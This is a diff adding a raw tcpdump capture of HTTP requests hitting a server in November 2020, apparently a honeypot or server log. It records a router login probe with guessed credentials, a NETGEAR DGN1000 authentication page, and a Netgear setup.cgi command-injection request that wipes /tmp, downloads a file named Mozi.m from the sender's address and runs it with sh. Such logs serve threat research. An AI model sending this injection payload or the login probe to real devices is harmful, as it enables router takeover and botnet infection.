@@ -1,0 +1,80 @@
+
+20:31:09.058057 IP (tos 0x0, ttl 51, id 65119, offset 0, flags [DF], proto TCP (6), length 114)
+    217.208.126.65.48288 > 46.21.150.52.80: Flags [P.], cksum 0x1c7e (correct), seq 1117692621:1117692683, ack 378928351, win 2920, options [nop,nop,TS val 82271836 ecr 4294906903], length 62: HTTP, length: 62
+	GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0
+	
+20:31:09.069816 IP (tos 0x0, ttl 62, id 59548, offset 0, flags [DF], proto TCP (6), length 344)
+    46.21.150.52.80 > 217.208.126.65.48288: Flags [P.], cksum 0x9f64 (correct), seq 1:293, ack 62, win 905, options [nop,nop,TS val 4294907020 ecr 82271836], length 292: HTTP, length: 292
+	HTTP/1.0 404 Not Found
+	Server: 
+	Date: Sun, 15 Nov 2020 20:31:08 GMT
+	Content-Type: text/html
+	Connection: close
+	
+	<HTML>
+	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
+	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
+	<H4>404 Not Found</H4>
+	File not found.
+	</BODY>
+	</HTML>
+20:31:09.228351 IP (tos 0x0, ttl 51, id 65120, offset 0, flags [DF], proto TCP (6), length 185)
+    217.208.126.65.48288 > 46.21.150.52.80: Flags [P.], cksum 0x8bb0 (correct), seq 62:195, ack 1, win 2920, options [nop,nop,TS val 82272006 ecr 4294907018], length 133: HTTP
+20:37:25.672513 IP (tos 0x0, ttl 52, id 686, offset 0, flags [DF], proto TCP (6), length 56)
+    59.127.176.11.38528 > 46.21.150.52.80: Flags [P.], cksum 0xdc61 (correct), seq 2544424940:2544424956, ack 1992145008, win 7260, length 16: HTTP, length: 16
+	GET / HTTP/1.1
+20:37:25.811029 IP (tos 0x0, ttl 52, id 687, offset 0, flags [DF], proto TCP (6), length 282)
+    59.127.176.11.38528 > 46.21.150.52.80: Flags [P.], cksum 0x8349 (correct), seq 16:258, ack 1, win 7260, length 242: HTTP
+20:37:25.823863 IP (tos 0x0, ttl 62, id 15396, offset 0, flags [DF], proto TCP (6), length 1092)
+    46.21.150.52.80 > 59.127.176.11.38528: Flags [P.], cksum 0x6060 (correct), seq 1:1053, ack 258, win 980, length 1052: HTTP, length: 1052
+	HTTP/1.1 401 Unauthorized
+	Server: 
+	Date: Sun, 15 Nov 2020 20:37:25 GMT
+	WWW-Authenticate: Basic realm="NETGEAR DGN1000 "
+	Content-Type: text/html
+	Connection: close
+	
+	<html>
+	<head>
+	<META http-equiv="Pragma" CONTENT="no-cache">
+	<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache">	
+	<meta HTTP-EQUIV="Expires" CONTENT="Mon, 06 Jan 1990 00:00:01 GMT"> 
+	
+	
+	<meta name="description" content="DG834N 1049">
+	<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1">
+	
+		
+	 
+	
+	
+	
+	
+	
+	
+	<title> Authorization warning</title>
+	</head>
+	
+	<body bgcolor="#ffffff">
+	<p><font size=4 color="#0099cc" face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>Warning</font></p>
+	
+	<hr color="#0099cc">
+	
+	<p align="center"><b><font size=3 face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>System Authentication Failed.</font></b></p>
+	
+	<p align="center"><BR><font size=-1 face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>
+	Please contact your system administrator for the correct information.</font></p>
+	
+	</body>
+	</html>
+	</BODY>
+	</HTML>
+20:51:19.070066 IP (tos 0x0, ttl 51, id 38096, offset 0, flags [DF], proto TCP (6), length 217)
+    112.162.153.65.36054 > 46.21.150.52.80: Flags [P.], cksum 0x89d5 (correct), seq 1944163254:1944163431, ack 2146567404, win 7300, length 177: HTTP, length: 177
+	GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.162.153.65:54573/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
+	
+20:51:19.102037 IP (tos 0x0, ttl 62, id 43826, offset 0, flags [DF], proto TCP (6), length 57)
+    46.21.150.52.80 > 112.162.153.65.36054: Flags [P.], cksum 0x03a8 (correct), seq 1:18, ack 177, win 980, length 17: HTTP, length: 17
+	HTTP/1.0 200 OK
+20:51:19.161371 IP (tos 0x0, ttl 62, id 43827, offset 0, flags [DF], proto TCP (6), length 226)
+    46.21.150.52.80 > 112.162.153.65.36054: Flags [FP.], cksum 0xc959 (correct), seq 18:204, ack 177, win 980, length 186: HTTP
